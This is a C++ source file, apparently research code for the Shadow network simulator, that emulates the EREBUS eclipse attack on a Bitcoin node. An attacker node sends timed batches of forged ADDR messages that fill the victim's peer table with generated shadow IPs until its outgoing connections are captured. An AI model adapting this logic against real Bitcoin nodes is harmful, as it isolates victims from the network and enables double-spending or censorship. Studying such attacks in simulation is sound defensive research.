        SOCKET hSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if (hSocket == INVALID_SOCKET)
            return INVALID_SOCKET;

        // Set the no-delay option (disable Nagle's algorithm) on the TCP socket.
        int set = 1;
        setsockopt(hSocket, IPPROTO_TCP, TCP_NODELAY, (const char *) &set, sizeof(int));

        // Set the non-blocking option on the socket.
        if (!SetSocketNonBlocking(hSocket, true)) {
            CloseSocket(hSocket);
            std::cout << "Setting socket to non-blocking failed" << "\n";
            exit(-1);
        }

        return hSocket;
    }

public:
    ActiveNode(std::string ip_addr, int port) {
        _shadow_ip = ip_addr;
        std::cout << "Node generated" << "\n";

        int sockfd = CreateNewSocket();

        // bind to shadow's virtual NIC
        struct sockaddr_in new_addr;    /* my address information */
        new_addr.sin_family = AF_INET;         /* host byte order */
        new_addr.sin_port = htons(port);     /* short, network byte order */
        new_addr.sin_addr.s_addr = inet_addr(ip_addr.c_str());
        bzero(&(new_addr.sin_zero), 8);        /* zero the rest of the struct */

        if (shadow_bind(sockfd, (struct sockaddr *) &new_addr, sizeof(struct sockaddr)) == -1) {
            perror("bind");
            exit(1);
        }

        // listen
        if (listen(sockfd, 10) == -1) {
            perror("listen");
            exit(1);
        }

        // register a watcher
        _listen_sockfd = sockfd;
        _listen_watcher.set<ActiveNode, &ActiveNode::_listenSocketIOCallback>(this);
        _listen_watcher.start(_listen_sockfd, ev::READ);
    }

    void SendAddr(std::vector<std::string> vIP) {
        // get victim address
        if (mSocketControl.empty())
            return;

        // retrieve first data socket, since it is assumed to be an attacker node.
        // TODO : what if it has multiple connection? How can it recognize the victim node?
        auto&[fd, socketControl] = *mSocketControl.begin();
        std::deque<std::vector<unsigned char>> &vSendMsg = socketControl.getVSendMsg();
        std::cout << "before ForgeAddrMsg" << "\n";
        bool ret = ForgeAddrMSG(vIP, vSendMsg, socketControl.their_ip, socketControl.their_port);
        std::cout << "after ForgeAddrMsg" << "\n";
        if (!ret) {
            std::cout << "failed to forge ADDR msg" << "\n";
            exit(-1);
        }
        if (!vSendMsg.empty()) { // set Writable
            socketControl.getDataSocketWatcher().set(fd, ev::READ | ev::WRITE);
        }
    }

    void ChurnOut() {
        // close all datasocket
        for (auto&[fd, socketControl] : mSocketControl) {
            close(fd);
        }
        mSocketControl.clear();
    }

    void Connect(std::string ip, int port) {
        int remote_fd = CreateNewSocket();

        int conn_port = 30001; // Random port for connection. TODO: randomly assign?

        // bind to shadow's virtual NIC
        struct sockaddr_in new_addr;    /* my address information */
        new_addr.sin_family = AF_INET;         /* host byte order */
        new_addr.sin_port = htons(conn_port);     /* short, network byte order */
        new_addr.sin_addr.s_addr = inet_addr(_shadow_ip.c_str());
        bzero(&(new_addr.sin_zero), 8);        /* zero the rest of the struct */

        if (shadow_bind(remote_fd, (struct sockaddr *) &new_addr, sizeof(struct sockaddr)) == -1) {
            perror("bind");
            exit(1);
        }

        struct sockaddr_in servaddr;
        bzero(&servaddr, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(port);
        servaddr.sin_addr.s_addr = inet_addr(ip.c_str());

        int ret = connect(remote_fd, (struct sockaddr *) &servaddr, sizeof(servaddr));
        if (ret < 0 && errno != EINPROGRESS) {
            perror("connect");
            std::cout << "Unable to connect to " << ip << "\n";
            exit(-1);
        } else if (ret == 0) {
            std::cout << "connection established" << "\n";
            std::cout << "non-blocking socket is immediately established. is it possible?" << "\n";
            exit(-1);
        } else if (ret > 0) {
            std::cout << "unexpected return value of non-blocking connect" << "\n";
            exit(-1);
        }


        // Create DataSocket and start a event watcher for the DataSocket
        mSocketControl.try_emplace(remote_fd, SocketControlStruct<MSG>(remote_fd, inet_ntoa(servaddr.sin_addr),
                                                                       ntohs(servaddr.sin_port), false));
        std::cout << "node: try to connect to " << mSocketControl[remote_fd].their_ip << ":"
                  << mSocketControl[remote_fd].their_port << "\n";

        ev::io &watcher = mSocketControl[remote_fd].getConnSocketWatcher();
        watcher.set<ActiveNode, &ActiveNode::_connSocketIOCallback>(this);
        watcher.start(remote_fd, ev::WRITE);
    }

};

class AddrTimer {
private:
    ev::timer _timer;
    double _time;
    std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> > _attacker_node;
    std::vector<std::string> vAddr;
public:
    AddrTimer(double time, std::vector<std::string> addrs,
              std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto>> node)
            : vAddr(addrs), _attacker_node(node) {
        _timer.set<AddrTimer, &AddrTimer::_timerCallback>(this);
        _timer.set(time, 0.);
        _timer.start();
        _time = time;
    }

    // TODO : Maybe, don't allow move constructor for AddrTimer?
    AddrTimer(AddrTimer &&rhs) noexcept: _time(std::move(rhs._time)), vAddr(std::move(rhs.vAddr)) {
        _attacker_node = rhs._attacker_node;
        rhs._timer.stop();
        _timer.set<AddrTimer, &AddrTimer::_timerCallback>(this);
        _timer.set(_time, 0.);
        _timer.start();
        std::cout << "AddrTimer's move constructor!" << "\n";
    }

    AddrTimer(const AddrTimer &rhs) = delete; // since PassiveNode includes ev::timer

    void _timerCallback(ev::timer &w, int revents) {
        std::cout << "timer called" << "\n";
        _attacker_node->SendAddr(vAddr);
    }
};

static bool _dns_isIPInRange(const struct in_addr netIP, std::string cidrStr) {
    auto pos = cidrStr.find('/');
    if (pos == std::string::npos)
        assert (0 && "wrong argument for _dns_isIPInRange");
    std::string cidrIPStr = cidrStr.substr(0, pos);
    std::string bits = cidrStr.substr(pos + 1);
    int cidrBits = std::stoi(bits);

    assert(cidrBits >= 0 && cidrBits <= 32);

    /* first create the mask in host order */
    in_addr_t netmask = 0;
    for (int i = 0; i < 32; i++) {
        /* move one so LSB is 0 */
        netmask = netmask << 1;
        if (cidrBits > i) {
            /* flip the LSB */
            netmask++;
        }
    }

    /* flip to network order */
    netmask = htonl(netmask);

    /* get the subnet ip in network order */
    struct in_addr subnetIP;
    inet_pton(AF_INET, cidrIPStr.c_str(), &subnetIP);

    /* all non-subnet bits should be flipped */
    if ((netIP.s_addr & netmask) == (subnetIP.s_addr & netmask)) {
        return true;
    } else {
        return false;
    }
}

static bool _dns_isRestricted(std::string ip) {
    struct in_addr netIP;
    inet_pton(AF_INET, ip.c_str(), &netIP);
    /* http://en.wikipedia.org/wiki/Reserved_IP_addresses#Reserved_IPv4_addresses */
    if (_dns_isIPInRange(netIP, "0.0.0.0/8") ||
        _dns_isIPInRange(netIP, "10.0.0.0/8") ||
        _dns_isIPInRange(netIP, "100.64.0.0/10") ||
        _dns_isIPInRange(netIP, "127.0.0.0/8") ||
        _dns_isIPInRange(netIP, "169.254.0.0/16") ||
        _dns_isIPInRange(netIP, "172.16.0.0/12") ||
        _dns_isIPInRange(netIP, "192.0.0.0/29") ||
        _dns_isIPInRange(netIP, "192.0.2.0/24") ||
        _dns_isIPInRange(netIP, "192.88.99.0/24") ||
        _dns_isIPInRange(netIP, "192.168.0.0/16") ||
        _dns_isIPInRange(netIP, "198.18.0.0/15") ||
        _dns_isIPInRange(netIP, "198.51.100.0/24") ||
        _dns_isIPInRange(netIP, "203.0.113.0/24") ||
        _dns_isIPInRange(netIP, "224.0.0.0/4") ||
        _dns_isIPInRange(netIP, "240.0.0.0/4") ||
        _dns_isIPInRange(netIP, "255.255.255.255/32")) {
        return true;
    } else {
        return false;
    }
}

static std::string _generateRandomIP() {
    std::stringstream ss;
    while (true) {
        int ip[4];
        for (int i = 0; i < 4; i++) {
            ip[i] = rand() % 256;
            if (ip[i] == 0)
                ip[i]++;
        }

        if (ip[0] == 10)
            continue;
        if (ip[0] == 172 && ip[1] == 16)
            continue;
        if (ip[0] == 192 && ip[1] == 168)
            continue;

        ss.str("");
        ss << ip[0] << "." << ip[1] << "." << ip[2] << "." << ip[3];

        if (!_dns_isRestricted(ss.str()))
            break;
    }
    return ss.str();
}

//template<typename MSG,
//        bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
//        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t,
//                           std::string,
//                           bool),
//        bool (*ForgeAddrMSG)(std::vector<std::string>, std::deque<std::vector<unsigned char>> &, std::string,
//                             uint16_t),
//        bool (*InitProtocol)(std::deque<std::vector<unsigned char>> &, std::string, uint16_t)>
//class LegitimateIPFactory {
//    double _periodTime;
//    double _iprate; // IP per second
//    double _reachablerate;
//    std::vector<std::string> _vReachableIP;
//    std::vector<std::string> _vUnreachableIP;
//    std::shared_ptr<ActiveNode<MSG, ReceiveMSG, ProcessMSG, ForgeAddrMSG, InitProtocol> > _attackerNode;
//
//public:
//    LegitimateIPFactory(double periodTime, double iprate, double reachablerate, std::vector<std::string> vReachableIP,
//                        std::vector<std::string> vUnreachableIP,
//                        std::shared_ptr<ActiveNode<MSG, ReceiveMSG, ProcessMSG, ForgeAddrMSG, InitProtocol>> node)
//            : _periodTime(periodTime), _iprate(iprate), _reachablerate(reachablerate),
//              _vReachableIP(std::move(vReachableIP)), _vUnreachableIP(std::move(vUnreachableIP)),
//              _attackerNode(std::move(node)) {
//
//    }
//};

template<typename MSG,
        bool (*ReceiveMSG)(const char *, unsigned int, std::list<MSG> &, std::list<MSG> &),
        bool (*ProcessMSG)(MSG &, bool, std::deque<std::vector<unsigned char>> &, std::string, uint16_t, std::string,
                           bool)>
class ShadowIPFactory {
private:
    ev::timer _timer;
    double _periodTime;
    double _iprate; // IP per second
    double _shadowrate; // shadow IP portion
    std::vector<std::string> _vLegiIP;
    std::vector<std::string> _vUnreachLegiIP;
    std::vector<std::string> _vShadowIP;
    std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto> > _attacker_node;
    std::vector<PassiveNode<MSG, ReceiveMSG, ProcessMSG> > _vShadowNode;

    std::chrono::system_clock::time_point _prepare_start_time;
    std::chrono::system_clock::time_point _attack_start_time;
    bool _attack_phase = false;

    void _timerCallback(ev::timer &w, int revents) {
        std::vector<std::string> vAddr;
        auto now = std::chrono::system_clock::now();
        auto t_c = std::chrono::system_clock::to_time_t(now);
        std::cout << "Periodic timer called " << std::put_time(std::localtime(&t_c), "%F %T") << "\n";
        if (now >= _attack_start_time && !_attack_phase) {
            _attack_phase = true;
            w.repeat = 600;
        }

        if (now < _attack_start_time) {
            // if it's prepare phase
            int totalIPCount = 1000;
            int legiIPcount = totalIPCount * 0.3;
            int unreLegiIPcount = totalIPCount * 0.7;
            int shadowIPcount = 0;
            std::sample(_vLegiIP.begin(), _vLegiIP.end(), std::back_inserter(vAddr), legiIPcount,
                        std::mt19937{std::random_device{}()});
            std::sample(_vUnreachLegiIP.begin(), _vUnreachLegiIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
                        std::mt19937{std::random_device{}()});
            std::cout << "debug print start (prepare phase)" << "\n";
            std::cout << "legiIPcount:" << legiIPcount << ", unreachable legiIPCount:" << unreLegiIPcount << ", shadowIPcount:" << shadowIPcount << "\n";
        }
        else {
            // if it's attack phase
            int totalIPCount = std::min(1000, (int) (_periodTime * _iprate));
            int legiIPcount = totalIPCount * (1 - _shadowrate) * 0.3;
            int unreLegiIPcount = totalIPCount * (1 - _shadowrate) * 0.7;
            int shadowIPcount = totalIPCount * _shadowrate;

            std::sample(_vLegiIP.begin(), _vLegiIP.end(), std::back_inserter(vAddr), legiIPcount,
                        std::mt19937{std::random_device{}()});
            std::sample(_vUnreachLegiIP.begin(), _vUnreachLegiIP.end(), std::back_inserter(vAddr), unreLegiIPcount,
                        std::mt19937{std::random_device{}()});
            std::sample(_vShadowIP.begin(), _vShadowIP.end(), std::back_inserter(vAddr), shadowIPcount,
                        std::mt19937{std::random_device{}()});
            std::cout << "debug print start (attack phase)" << "\n";
            std::cout << "legiIPcount:" << legiIPcount << ", unreachable legiIPCount:" << unreLegiIPcount << ", shadowIPcount:" << shadowIPcount << "\n";
        }

//        for (int i = 0; i < shadowIPcount; i++) {
//            std::string randIP = _generateRandomIP();
//            vAddr.push_back(_generateRandomIP());
//            _vShadowIP.push_back(randIP);
//            _vShadowNode.emplace_back(randIP, 8333, true);
//        }

        int cur_time = GetTime();
        std::cout << "cur_time:" << cur_time << "\n";
        int shadow_outgoing_count = 0;
        for (auto&[ip, timestamp] : mPingTimestamp) {
            if (cur_time - timestamp < 1000) {
                std::cout << "shadow_ip=" << ip << "\n";
                shadow_outgoing_count++;
            }
        }
        std::cout << "shadow outgoing count=" << shadow_outgoing_count << "\n";
        if (shadow_outgoing_count >= 10) {
            std::cout << "all outgoing connection are connected by Shadow IP" << "\n";
            exit(0);
        }
//        for (auto addr : vAddr)
//            std::cout << addr << "\n";
//        std::cout << "debug print end" << "\n";
        _attacker_node->SendAddr(vAddr);
    }

public:
    ShadowIPFactory(double periodTime, double iprate, double shadowrate, std::vector<std::string> vIP,
                    std::vector<std::string> vUnreIP, std::vector<std::string> vShadowIP,
                    std::shared_ptr<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto>> node)
            : _periodTime(periodTime), _iprate(iprate), _shadowrate(shadowrate), _vLegiIP(std::move(vIP)),
              _vUnreachLegiIP(std::move(vUnreIP)), _vShadowIP(std::move(vShadowIP)), _attacker_node(std::move(node)) {
        std::cout << "ShadowIPGenerator constructor" << "\n";
        _timer.set<ShadowIPFactory, &ShadowIPFactory::_timerCallback>(this);
        _timer.set(15, _periodTime);
        _timer.start();

        // register virtual Node structure (including a virtual NIC) for shadow IPs
        for (auto shadowIP : _vShadowIP) {
            _vShadowNode.emplace_back(shadowIP, 8333, true);
        }

        // set time
        _prepare_start_time = std::chrono::system_clock::now();
        _attack_start_time = _prepare_start_time + std::chrono::hours(30*24); // 1 month
    }
};

class ChurnOutTimer {
private:
    double _time;
    ev::timer _timer;
    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> &_benign_node;
public:
    ChurnOutTimer(double time,
                  PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> &node) : _benign_node(node) {
        _timer.set<ChurnOutTimer, &ChurnOutTimer::_timerCallback>(this);
        _timer.set(time, 0.);
        _timer.start();
    }

    void _timerCallback(ev::timer &w, int revents) {
        std::cout << "churnout timer called" << "\n";
        _benign_node.ChurnOut();
    }
};

class trace {
public:
    trace() {}

    trace(int i) { std::cout << "trace ctor" << i << "\n"; }

    trace(const trace &) { std::cout << "copy ctor\n"; }

    trace &operator=(const trace &) {
        std::cout << "copy assign\n";
        return *this;
    }

    trace(trace &&) { std::cout << "move ctor\n"; }

    trace &operator=(trace &&) {
        std::cout << "move assign\n";
        return *this;
    }
};


int main(int argc, char *argv[]) {
    //c++20 test
    using namespace std::literals;
    std::cout << "C++20"sv.starts_with('C') << "\n";

    // Collect 100,000 reachable legitimate IPs from churn.txt
    std::ifstream read("churn.txt");
    std::map<std::string, int> mIpDuration;
    std::regex re("\\d+\\.\\d+\\.\\d+\\.\\d+");
    int ipCount = 0;
    for (std::string line; std::getline(read, line);) {
        // split and extract
        auto pos = line.find(' ');
        std::string ip = line.substr(0, pos);
        int duration = std::stoi(line.substr(pos));

        if (duration > 0 && std::regex_match(ip, re)) {
            mIpDuration.emplace(ip, duration);
            ipCount++;
            if (ipCount >= 100000)
                break;
        }
    }
    std::cout << "IP table updated. Count = " << mIpDuration.size() << "\n";


    std::vector<PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> > vPassiveNode;
    std::vector<std::string> vReachableIp;
    //std::vector<int> vDuration;
    for (const auto &[ip, duration] : mIpDuration) {
        vReachableIp.push_back(ip);
        vPassiveNode.emplace_back(ip, 8333);
        vPassiveNode.back().SetChurnOutTimer(duration);
        std::cout << "IP:" << ip << ", duration:" << duration << "\n";
    }


    exported_main();

    std::cout << "Starting ISP-server for emulated benign&attacker nodes" << "\n";

    std::set<std::string> sLegiIP(vReachableIp.begin(), vReachableIp.end());
    std::set<std::string> sUnreachLegiIP;
    std::set<std::string> sShadowIP;

    // Collect 1,000,000 unreachable legitimate IPs
    int unreachableIPtotalcount = 1000000;
    for (int i = 0; i < unreachableIPtotalcount; i++) {
        while (true) {
            std::string randIP = _generateRandomIP();

            if (!sLegiIP.contains(randIP) && !sUnreachLegiIP.contains(randIP)) {
                sUnreachLegiIP.insert(randIP);
                break;
            }
        }
    }

    std::cout << "unreachable legitimate IPs are collected" << "\n";

    // Collect 200,000 shadow IPs
    int shadowIPtotalcount = 200000;
    for (int i = 0; i < shadowIPtotalcount; i++) {
        while(true) {
            std::string randIP = _generateRandomIP();
            if (!sLegiIP.contains(randIP) && !sUnreachLegiIP.contains(randIP) && !sShadowIP.contains(randIP)) {
                sShadowIP.insert(randIP);
                break;
            }
        }
    }
    std::cout << "shadow IPs are collected" << "\n";


    // Step 1. Prepare an attacker node which connects to Bitcoin victim (thus become an inbound connection of bitcoin victim)
    auto attacker_node1 = std::make_shared<ActiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg, BitcoinForgeAddrMsg, BitcoinInitProto>>(
            "1.1.0.1", 8333);
    attacker_node1->Connect("1.0.0.1", 18333);


//    // Step 2. send a ADDR msg to the Bitcoin victim to indicate him establish outgoing connections.
//    int start_time = 15;
//    int ip_total_count = vReachableIp.size();
//    std::vector<AddrTimer> timers;
//    for (int i = 0; i < ip_total_count / 1000; i++) {
//        timers.emplace_back(start_time + i,
//                            std::vector<std::string>(vReachableIp.begin() + i * 1000, vReachableIp.begin() + (i + 1) * 1000),
//                            attacker_node1);
//    }
//    timers.emplace_back(start_time + ip_total_count / 1000 + 1,
//                        std::vector<std::string>(vReachableIp.begin() + (ip_total_count / 1000) * 1000, vReachableIp.end()),
//                        attacker_node1);



    std::vector<std::string> vUnreLegiIP(sUnreachLegiIP.begin(), sUnreachLegiIP.end());
    std::vector<std::string> vShadowIP(sShadowIP.begin(), sShadowIP.end());
    // Step 3. Initiate EREBUS attack using randomly created shadow IPs
    ShadowIPFactory<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> shadowIPFactory(900, 2, 0.9, vReachableIp, vUnreLegiIP, vShadowIP, attacker_node1);



//    AddrTimer addrTimer1(15, {"11.1.0.1", "11.2.0.1", "11.3.0.1", "11.4.0.1", "11.5.0.1", "11.6.0.1", "11.7.0.1", "11.8.0.1", "11.9.0.1", "11.10.0.1", "11.11.0.1", "11.12.0.1"}, attacker_node1);

    // Step 2. Prepare 10 benign nodes and send a ADDR msg to the Bitcoin victim to indicate him to establish outgoing connections.
    // As a result bitcoin victim will establish 10 benign outgoing connection, and 1 incoming connection established in Step 1(1.1.0.1)
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node1("11.1.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node2("11.2.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node3("11.3.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node4("11.4.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node5("11.5.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node6("11.6.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node7("11.7.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node8("11.8.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node9("11.9.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node10("11.10.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node11("11.11.0.1", 8333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> benign_node12("11.12.0.1", 8333);



//    // Step 3. Prepare 10 (shadow) attacker nodes and send a ADDR msg to the Bitcoin victim.
//    // But, Bitcoin victim will not be connected to the attacker nodes since its outgoing slots are fully occupied by benign nodes in above.
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node1("2.1.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node2("2.2.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node3("2.3.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node4("2.4.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node5("2.5.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node6("2.6.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node7("2.7.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node8("2.8.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node9("2.9.0.1", 18333);
//    PassiveNode<CNetMessage, BitcoinReceiveMsg, BitcoinProcessMsg> malicious_node10("2.10.0.1", 18333);
//    AddrTimer addrTimer2(40, {"2.1.0.1", "2.2.0.1", "2.3.0.1", "2.4.0.1", "2.5.0.1", "2.6.0.1", "2.7.0.1", "2.8.0.1", "2.9.0.1", "2.10.0.1"}, attacker_node1);
//
//    // Step 4. Churnout benign nodes, check whether the eclipse attack is successful for Bitcoin victim
//    ChurnOutTimer outTimer1(50, benign_node1);
//    ChurnOutTimer outTimer2(50, benign_node2);
//    ChurnOutTimer outTimer3(50, benign_node3);
//    ChurnOutTimer outTimer4(50, benign_node4);
//    ChurnOutTimer outTimer5(50, benign_node5);
//    ChurnOutTimer outTimer6(50, benign_node6);
//    ChurnOutTimer outTimer7(50, benign_node7);
//    ChurnOutTimer outTimer8(50, benign_node8);
//    ChurnOutTimer outTimer9(50, benign_node9);
//    ChurnOutTimer outTimer10(50, benign_node10);



    struct ev_loop *libev_loop = EV_DEFAULT;

    while (true) {
        std::cout << "before ev_run" << "\n";
        ev_run(libev_loop, EVRUN_ONCE);
    }
}
